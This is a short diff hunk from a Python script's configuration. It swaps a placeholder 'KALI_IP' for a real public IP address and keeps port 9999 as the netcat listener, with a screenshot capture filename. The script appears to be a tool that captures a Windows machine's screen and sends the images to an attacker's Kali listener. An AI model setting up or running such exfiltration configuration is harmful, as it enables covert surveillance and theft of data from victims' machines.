@@ -7,7 +7,7 @@ import os
 import platform
 
 # ------------------ Configuration ------------------
-KALI_IP = "192.168.1..."           # ←←← Your Kali Linux / listening server IP
+KALI_IP = "154.208.61.202"           # ←←← Your Kali Linux / listening server IP
 PORT = 9999                         # Port where netcat / server is listening
 ALSO_SAVE_ON_WINDOWS = False        # Set True only for local testing
 CAPTURE_FILENAME = "capture.png"    # Changed to PNG format
